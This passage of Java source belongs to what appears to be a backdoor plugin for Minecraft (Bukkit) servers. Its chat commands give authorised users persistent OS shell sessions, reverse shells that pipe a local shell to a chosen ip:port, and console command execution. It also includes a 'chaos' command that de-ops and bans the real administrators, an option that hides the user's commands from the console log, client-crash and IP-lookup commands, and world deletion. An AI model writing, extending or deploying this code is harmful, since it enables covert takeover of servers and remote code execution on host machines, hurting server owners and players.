            final String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_kick_reason;
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.kickPlayer(reason);
            });
            sendMessage(sender, "Kicked player " + target.getName() + ".");
        }
    }

    private class BanCommand extends Command {
        public BanCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "ban"; }
        @Override public String getDescription() { return "Bans a player."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            Bukkit.getBanList(BanList.Type.NAME).addBan(target.getName(), reason, null, sender.getName());
            if (target.isOnline() && target.getPlayer() != null) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    if(target.getPlayer() != null) {
                        target.getPlayer().kickPlayer(reason);
                    }
                });
            }
            sendMessage(sender, "Banned " + target.getName());
        }
    }

    private class BanIpCommand extends Command {
        public BanIpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "banip"; }
        @Override public String getDescription() { return "Bans a player by their IP address."; }
        @Override public String getUsage() { return "<player> [reason]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            String reason = (args.length > 1) ? String.join(" ", Arrays.copyOfRange(args, 1, args.length)) : Config.default_ban_reason;
            InetSocketAddress address = target.getAddress();
            if (address != null) {
                Bukkit.getBanList(BanList.Type.IP).addBan(address.getAddress().getHostAddress(), reason, null, sender.getName());
                final Player finalTarget = target;
                Bukkit.getScheduler().runTask(plugin, () -> {
                    finalTarget.kickPlayer(reason);
                });
                sendMessage(sender, "IP Banned " + target.getName());
            } else {
                sendError(sender, "Could not get IP for " + target.getName());
            }
        }
    }

    private class GamemodeCommand extends Command {
        public GamemodeCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "gamemode"; }
        @Override public String getDescription() { return "Switch to a specified gamemode."; }
        @Override public String getUsage() { return "<gamemode> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            GameMode gm;
            try {
                gm = GameMode.valueOf(args[0].toUpperCase());
            } catch (IllegalArgumentException e) {
                sendError(sender, "Invalid gamemode: " + args[0]);
                return;
            }
            Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
            if (target == null) { sendError(sender, "Player not found: " + args[1]); return; }
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.setGameMode(gm);
                sendMessage(sender, "Gamemode for " + target.getName() + " set to " + gm.name());
            });
        }
    }

    private class GiveCommand extends Command {
        public GiveCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "give"; }
        @Override public String getDescription() { return "Gives the specified item."; }
        @Override public String getUsage() { return "<item_name> [amount] [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Material material = Material.getMaterial(args[0].toUpperCase());
            if (material == null) { sendError(sender, "Unknown material: " + args[0]); return; }
            int amount = 1;
            if (args.length > 1) {
                try {
                    amount = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    sendError(sender, "Invalid amount: " + args[1]);
                    return;
                }
            }
            Player target = (args.length > 2) ? Bukkit.getPlayer(args[2]) : sender;
            if (target == null) { sendError(sender, "Player not found: " + args[2]); return; }
            target.getInventory().addItem(new ItemStack(material, amount));
            sendMessage(sender, "Giving " + amount + " of " + material.name() + " to " + target.getName());
        }
    }

    private class ExecCommand extends Command {
        public ExecCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "exec"; }
        @Override public String getDescription() { return "Executes a command as the server console."; }
        @Override public String getUsage() { return "<command...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            String command = String.join(" ", args);
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            });
            sendMessage(sender, "Executed: " + command);
        }
    }

    private class ShellCommand extends Command {
        public ShellCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "shell"; }
        @Override public String getDescription() { return "Manages persistent OS shell sessions."; }
        @Override public String getUsage() { return "<create|list|execute|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, getRequiredUsage(this));
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "execute":
                    handleExecute(sender, subArgs);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    sendError(sender, "Unknown subcommand. " + getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] shellArgs) {
            if (shellArgs.length < 1) {
                sendError(sender, "Usage: " + Config.command_prefix + "shell create <shell_path> [args...]");
                sendWarn(sender, "Example (Linux): !shell create /bin/bash --noprofile --norc");
                sendWarn(sender, "Example (Windows): !shell create cmd.exe");
                return;
            }
            
            int id = nextShellId.getAndIncrement();
            try {
                ShellSession session = new ShellSession(id, shellArgs);
                activeShellSessions.put(id, session);
                sendSuccess(sender, "Created new shell session #" + id + " with: " + String.join(" ", shellArgs));
            } catch (IOException e) {
                sendError(sender, "Failed to create shell session: " + e.getMessage());
            }
        }
        
        private void handleList(Player sender) {
            if (activeShellSessions.isEmpty()) {
                sendMessage(sender, "No active shell sessions.");
                return;
            }
            sendMessage(sender, ChatColor.GREEN + "Active shell sessions:");
            activeShellSessions.forEach((id, session) -> {
                String status = session.isAlive() ? ChatColor.GREEN + "Running" : ChatColor.RED + "Stopped";
                sendMessage(sender, " - ID: " + ChatColor.YELLOW + id + ChatColor.WHITE + " | Status: " + status);
            });
        }

        private void handleExecute(Player sender, String[] args) {
            if (args.length < 2) {
                sendError(sender, "Usage: " + Config.command_prefix + "shell execute <id> <command...>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid session ID: " + args[0]);
                return;
            }

            ShellSession session = activeShellSessions.get(id);
            if (session == null || !session.isAlive()) {
                sendError(sender, "Session with ID " + id + " not found or has been stopped.");
                return;
            }

            String commandToExecute = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            session.executeCommand(sender, commandToExecute);
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, "Usage: " + Config.command_prefix + "shell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }
            
            ShellSession session = activeShellSessions.remove(id);
            if (session != null) {
                session.destroy();
                sendSuccess(sender, "Stopped and removed shell session #" + id);
            } else {
                sendError(sender, "Session with ID " + id + " not found.");
            }
        }
    }

    private class ShellSession {
        private final int id;
        private final Process process;
        private final PrintWriter commandWriter;
        private final BufferedReader outputReader;
        private final Object lock = new Object();

        public ShellSession(int id, String[] shellCommand) throws IOException {
            this.id = id;
            ProcessBuilder builder = new ProcessBuilder(shellCommand);
            builder.redirectErrorStream(true);
            this.process = builder.start();
            this.commandWriter = new PrintWriter(new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8), true);
            this.outputReader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
        }

        public void executeCommand(Player sender, String command) {
            new Thread(() -> {
                synchronized (lock) {
                    try {
                        String endOfOutputMarker = "EOO_MARKER_" + UUID.randomUUID().toString();
                        commandWriter.println(command);
                        commandWriter.println("echo " + endOfOutputMarker);
                        StringBuilder commandOutput = new StringBuilder();
                        String line;
                        while ((line = outputReader.readLine()) != null) {
                            if (line.trim().equals(endOfOutputMarker)) {
                                break;
                            }
                            commandOutput.append(line).append("\n");
                        }
                        
                        String finalOutput = commandOutput.toString().trim();
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            sendMessage(sender, ChatColor.AQUA + "--- Output for Shell #" + id + " ---");
                            if (finalOutput.isEmpty()) {
                                sendMessage(sender, ChatColor.GRAY + "(Command executed with no output)");
                            } else {
                                for(String outputLine : finalOutput.split("\n")) {
                                    sendMessage(sender, outputLine);
                                }
                            }
                            sendMessage(sender, ChatColor.AQUA + "----------------------------");
                        });
                    } catch (IOException e) {
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            sendError(sender, "Error communicating with shell #" + id + ". Session terminated. " + e.getMessage());
                        });
                        destroy();
                        activeShellSessions.remove(this.id);
                    }
                }
            }).start();
        }

        public void destroy() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            try {
                if (commandWriter != null) commandWriter.close();
                if (outputReader != null) outputReader.close();
            } catch (IOException e) {}
        }

        public boolean isAlive() {
            return process != null && process.isAlive();
        }
    }

    private class ReverseShellInstance {
        private final int id;
        private final String host;
        private final int port;
        private final String[] shellCmd;
        private final Plugin plugin;
        private Process process;
        private Socket socket;
        private final Consumer<String> onConnect;
        private final Consumer<String> onDisconnect;
        private final Consumer<String> onError;

        public ReverseShellInstance(int id, String host, int port, String[] shellCmd, Plugin plugin, Consumer<String> onConnect, Consumer<String> onDisconnect, Consumer<String> onError) {
            this.id = id;
            this.host = host;
            this.port = port;
            this.shellCmd = shellCmd;
            this.plugin = plugin;
            this.onConnect = onConnect;
            this.onDisconnect = onDisconnect;
            this.onError = onError;
        }

        public void start() {
            new Thread(() -> {
                try {
                    process = new ProcessBuilder(shellCmd).redirectErrorStream(true).start();
                    socket = new Socket();
                    socket.connect(new InetSocketAddress(host, port), 10000);
                    socket.setKeepAlive(true);
                    runOnMainThread(() -> onConnect.accept("Reverse shell (ID: " + id + ") connected successfully."));
                    new Thread(this::pipeShellToSocket).start();
                    new Thread(this::pipeSocketToShell).start();
                    process.waitFor();
                } catch (Exception e) {
                    runOnMainThread(() -> onError.accept("Shell connection error (ID: " + id + "): " + e.getMessage()));
                } finally {
                    cleanup();
                }
            }).start();
        }

        private void pipeShellToSocket() {
            // Process -> Socket
            try (InputStream processInput = process.getInputStream(); OutputStream socketOutput = socket.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = processInput.read(buffer)) != -1) {
                    socketOutput.write(buffer, 0, bytesRead);
                    socketOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                closeSocket();
            }
        }

        private void pipeSocketToShell() {
            // Socket -> Process
            try (InputStream socketInput = socket.getInputStream(); OutputStream processOutput = process.getOutputStream()) {
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = socketInput.read(buffer)) != -1) {
                    processOutput.write(buffer, 0, bytesRead);
                    processOutput.flush();
                }
            } catch (IOException ignored) {
            } finally {
                if (process.isAlive()) {
                    process.destroy();
                }
            }
        }

        public void stop() {
            closeSocket();
        }

        private void closeSocket() {
            try {
                if (socket != null && !socket.isClosed()) {
                    socket.close();
                }
            } catch (IOException ignored) {}
        }

        private void cleanup() {
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
            closeSocket();
            runOnMainThread(() -> onDisconnect.accept("Reverse shell (ID: " + id + ") has been disconnected."));
        }

        public String getDetails() {
            return host + ":" + port + " - " + String.join(" ", shellCmd);
        }

        public int getId() {
            return id;
        }

        private void runOnMainThread(Runnable task) {
            new BukkitRunnable() {
                @Override
                public void run() {
                    task.run();
                }
            }.runTask(plugin);
        }
    }

    private class ReverseShellCommand extends Command {
        private final Map<Integer, ReverseShellInstance> activeShells = new ConcurrentHashMap<>();
        private int nextId = 0;

        public ReverseShellCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "revshell"; }
        @Override public String getDescription() { return "Creates and manages reverse shell connections."; }
        @Override public String getUsage() { return "<create|list|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, getRequiredUsage(this));
                sendWarn(sender, "Example: " + Config.command_prefix + "revshell create 127.0.0.1:4444 /bin/bash");
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    sendError(sender, getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] args) {
            if (args.length < 2) {
                sendError(sender, "Usage: " + Config.command_prefix + "revshell create <ip:port> <shell_command...>");
                return;
            }
            String[] parts = args[0].split(":");
            if (parts.length != 2) {
                sendError(sender, "Invalid ip:port format: '" + args[0] + "'");
                return;
            }
            String host = parts[0];
            int port;
            try {
                port = Integer.parseInt(parts[1]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid port: '" + parts[1] + "'");
                return;
            }
            String[] shellCmd = Arrays.copyOfRange(args, 1, args.length);
            final int shellId = ++nextId;

            sendMessage(sender, "Attempting to create reverse shell (ID: " + shellId + ") to " + host + ":" + port + "...");

            Consumer<String> onConnect = message -> sendSuccess(sender, message);
            Consumer<String> onError = message -> {
                sendError(sender, message);
                activeShells.remove(shellId);
            };
            Consumer<String> onDisconnect = message -> {
                if (activeShells.containsKey(shellId)) {
                    sendWarn(sender, message);
                    activeShells.remove(shellId);
                }
            };

            ReverseShellInstance shell = new ReverseShellInstance(shellId, host, port, shellCmd, plugin, onConnect, onDisconnect, onError);
            activeShells.put(shellId, shell);
            shell.start();
        }

        private void handleList(Player sender) {
            if (activeShells.isEmpty()) {
                sendMessage(sender, "No active reverse shells.");
                return;
            }
            sendMessage(sender, ChatColor.GREEN + "Active reverse shells:");
            for (ReverseShellInstance shell : activeShells.values()) {
                sendMessage(sender, ChatColor.YELLOW + " - ID: " + shell.getId() + " | " + ChatColor.WHITE + shell.getDetails());
            }
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                sendError(sender, "Usage: " + Config.command_prefix + "revshell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }
            ReverseShellInstance shell = activeShells.get(id);
            if (shell == null) {
                sendError(sender, "No active shell found with ID: " + id);
                return;
            }
            sendMessage(sender, "Sent stop signal to shell ID: " + id);
            shell.stop();
        }
    }

    private class InfoCommand extends Command {
        public InfoCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "info"; }
        @Override public String getDescription() { return "Shows information about the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            try {
                URL url = new URL("https://api.ipify.org/");
                BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                String ip = br.readLine();
                Runtime r = Runtime.getRuntime();
                long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                long memMax = r.maxMemory() / 1048576L;
                sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
                sendMessage(sender, ChatColor.WHITE + "Server IP: " + ChatColor.GRAY + ip + ":" + Bukkit.getServer().getPort());
                sendMessage(sender, ChatColor.WHITE + "Server version: " + ChatColor.GRAY + Bukkit.getVersion());
                sendMessage(sender, ChatColor.WHITE + "OS: " + ChatColor.GRAY + System.getProperty("os.name"));
                sendMessage(sender, ChatColor.WHITE + "RAM (used/max): " + ChatColor.GRAY + memUsed + "MB / " + memMax + "MB");
                sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
            } catch (IOException e) {
                sendError(sender, "Error gathering system info.");
            }
        }
    }

    private class ChaosCommand extends Command {
        public ChaosCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "chaos"; }
        @Override public String getDescription() { return "Deops and bans all ops, ops all regular players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                boolean isAdmin = p.isOp() || p.hasPermission("*") || p.hasPermission("group.admin");
                if (isAdmin && !isUserAuthorized(p)) {
                    DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, false);
                    Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(), Config.default_ban_reason, null, Config.default_ban_source);
                    if (p.isOnline()) {
                        p.kickPlayer(Config.default_ban_reason);
                    }
                } else if (!isAdmin) {
                    DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                }
            }
            Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
        }
    }

    private class EnchantCommand extends Command {
        public EnchantCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "enchant"; }
        @Override public String getDescription() { return "Applies a specific enchantment to the held item."; }
        @Override public String getUsage() { return "<enchantment> <level> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) {
                sendError(sender, getRequiredUsage(this));
                sendWarn(sender, "Example: !enchant sharpness 100");
                sendWarn(sender, "Example: !enchant efficiency 10 Kudo");
                return;
            }

            Player target = sender;
            if (args.length > 2) {
                target = Bukkit.getPlayer(args[2]);
                if (target == null) {
                    sendError(sender, "Player not found: " + args[2]);
                    return;
                }
            }

            ItemStack item = target.getInventory().getItemInMainHand();
            if (item.getType() == Material.AIR) {
                sendError(sender, target.getName() + " is not holding an item.");
                return;
            }

            ItemMeta meta = item.getItemMeta();
            if (meta == null) {
                sendError(sender, "Could not get item metadata.");
                return;
            }

            Enchantment enchantment = Enchantment.getByKey(NamespacedKey.minecraft(args[0].toLowerCase()));
            if (enchantment == null) {
                sendError(sender, "Invalid enchantment: " + args[0] + ". Use the Minecraft ID name (e.g., 'sharpness', 'unbreaking', 'fire_aspect').");
                return;
            }

            int level;
            try {
                level = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                sendError(sender, "Invalid level: " + args[1] + ". Must be a number.");
                return;
            }
            meta.addEnchant(enchantment, level, true);
            item.setItemMeta(meta);
            sendSuccess(sender, "Applied " + enchantment.getKey().getKey() + " " + level + " to " + target.getName() + "'s item.");
        }
    }

    private class SeedCommand extends Command {
        public SeedCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "seed"; }
        @Override public String getDescription() { return "Gets the current world seed."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            String seedString = String.valueOf(sender.getWorld().getSeed());
            ClickEvent clickEvent = new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seedString);
            HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Click to copy!").create() );
            TextComponent message = new TextComponent("World seed: ");
            TextComponent openBracket = new TextComponent("[");
            TextComponent seedComponent = new TextComponent(seedString);
            seedComponent.setColor(ChatColor.GREEN.asBungee());
            seedComponent.setClickEvent(clickEvent);
            seedComponent.setHoverEvent(hoverEvent);
            TextComponent closeBracket = new TextComponent("]");
            message.addExtra(openBracket);
            message.addExtra(seedComponent);
            message.addExtra(closeBracket);
            sendMessage(sender, message);
        }
    }

    private class StopCommand extends Command {
        public StopCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "stop"; }
        @Override public String getDescription() { return "Shuts down the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            sendMessage(sender, "Server shutting down...");
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.shutdown();
            });
        }
    }

    private class PlayerSayCommand extends Command {
        public PlayerSayCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "psay"; }
        @Override public String getDescription() { return "Sends a message as another player."; }
        @Override public String getUsage() { return "<player> <message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            String message = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.chat(message);
            });
        }
    }

    private class ServerSayCommand extends Command {
        public ServerSayCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "ssay"; }
        @Override public String getDescription() { return "Sends a message as the server."; }
        @Override public String getUsage() { return "<message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            String message = String.join(" ", args);
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + message);
            });
        }
    }

    private class RenameCommand extends Command {
        public RenameCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "rename"; }
        @Override public String getDescription() { return "Changes your display name."; }
        @Override public String getUsage() { return "<name...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            String name = ChatColor.translateAlternateColorCodes('&', String.join(" ", args));
            Bukkit.getScheduler().runTask(plugin, () -> {
                sender.setDisplayName(name);
                sender.setPlayerListName(name);
            });
            sendMessage(sender, "Your name was changed to " + name);
        }
    }

    private class ReloadCommand extends Command {
        public ReloadCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "reload"; }
        @Override public String getDescription() { return "[Visible] Reloads the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.reload();
            });
        }
    }

    private class GetIpCommand extends Command {
        public GetIpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "getip"; }
        @Override public String getDescription() { return "Gets the IP address of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            InetSocketAddress address = target.getAddress();
            if (address == null) { sendError(sender, "Could not get IP for " + target.getName()); return; }
            sendMessage(sender, target.getName() + "'s IP: " + ChatColor.RED + address.getAddress().getHostAddress());
        }
    }

    private class ListWorldsCommand extends Command {
        public ListWorldsCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "listworlds"; }
        @Override public String getDescription() { return "Displays all loaded worlds."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            StringJoiner joiner = new StringJoiner(", ");
            for (World w : Bukkit.getWorlds()) {
                joiner.add(w.getName());
            }
            sendMessage(sender, "Worlds: " + joiner.toString());
        }
    }

    private class MakeWorldCommand extends Command {
        public MakeWorldCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "makeworld"; }
        @Override public String getDescription() { return "Creates a new world. This can cause significant server lag."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            String worldName = args[0];
            if (Bukkit.getWorld(worldName) != null) { sendError(sender, "A world with this name already exists."); return; }
            sendMessage(sender, "Starting to create world '" + worldName + "'. The server will freeze during this process!");
            Bukkit.getScheduler().runTask(plugin, () -> {
                new WorldCreator(worldName).createWorld();
                sendMessage(sender, "World '" + worldName + "' has been created successfully!");
            });
        }
    }

    private class DelWorldCommand extends Command {
        public DelWorldCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "delworld"; }
        @Override public String getDescription() { return "Deletes a world."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            World world = Bukkit.getWorld(args[0]);
            if (world == null) { sendError(sender, "World not found: " + args[0]); return; }
            File worldFolder = world.getWorldFolder();
            sendMessage(sender, "Attempting to delete world: " + world.getName());
            Bukkit.getScheduler().runTask(plugin, () -> {
                if (Bukkit.unloadWorld(world, false)) {
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                        boolean deleted = deleteWorld(worldFolder);
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            sendMessage(sender, "World '" + world.getName() + (deleted ? "' deleted successfully." : "' failed to delete."));
                        });
                    });
                } else {
                    sendError(sender, "Failed to unload world '" + world.getName() + "'.");
                }
            });
        }
    }

    private class VanishCommand extends Command {
        public VanishCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "vanish"; }
        @Override public String getDescription() { return "Toggles your visibility to other players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isVanished = getState(sender.getName(), State.VANISHED);
            setState(sender.getName(), State.VANISHED, !isVanished);
            if (!isVanished) {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        all.hidePlayer(plugin, sender);
                    });
                sendMessage(sender, "You are now vanished.");
            } else {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(plugin, () -> {
                        all.showPlayer(plugin, sender);
                    });
                sendMessage(sender, "You are no longer vanished.");
            }
        }
    }

    private class LogBlockCommand extends Command {
        public LogBlockCommand(Plugin plugin) { super(plugin); }

        @Override public String getName() { return "logblock"; }
        @Override public String getDescription() { return "Toggles logging of your executed commands in the console."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isLogBlocked = getState(sender.getName(), State.LOG_BLOCKED);
            setState(sender.getName(), State.LOG_BLOCKED, !isLogBlocked);
            if (!isLogBlocked) {
                sendSuccess(sender, "Your commands will not appear in the server console.");
            } else {
                sendWarn(sender, "Your commands will now appear in the server console.");
            }
        }
    }

    private class SilkTouchCommand extends Command {
        public SilkTouchCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "silktouch"; }
        @Override public String getDescription() { return "Toggles silk touch hands for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = getState(target.getName(), State.SILKTOUCH);
            setState(target.getName(), State.SILKTOUCH, !isEnabled);
            sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " silk touch hands.");
        }
    }

    private class InstaBreakCommand extends Command {
        public InstaBreakCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "instabreak"; }
        @Override public String getDescription() { return "Toggles instant block breaking for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = getState(target.getName(), State.INSTABREAK);
            setState(target.getName(), State.INSTABREAK, !isEnabled);
            sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " insta-break.");
        }
    }

    private class CrashCommand extends Command {
        public CrashCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "crash"; }
        @Override public String getDescription() { return "Attempts to crash a player's client."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { sendError(sender, getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { sendError(sender, "Player not found: " + args[0]); return; }
            for (int x = 0; x < 100; x++) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    target.spawnParticle(Particle.EXPLOSION_HUGE, target.getLocation(), Integer.MAX_VALUE);
                });
            }
            sendMessage(sender, "Attempting to crash " + target.getName());
        }
    }

    private class TrollCommand extends Command {
        public TrollCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "troll"; }
        @Override public String getDescription() { return "Toggles various troll effects on a player."; }
        @Override public String getUsage() { return "<method> <player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { sendError(sender, getRequiredUsage(this)); return; }
            String method = args[0].toLowerCase();
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) { sendError(sender, "Player not found: " + args[1]); return; }

            if (method.equalsIgnoreCase("reset")) {
                clearState(target.getName());
                sendMessage(sender, "Reset all troll states for " + target.getName());
                return;
            }
            try {
                State trollState = State.valueOf("MF_" + method.toUpperCase());
                boolean isEnabled = getState(target.getName(), trollState);
                setState(target.getName(), trollState, !isEnabled);
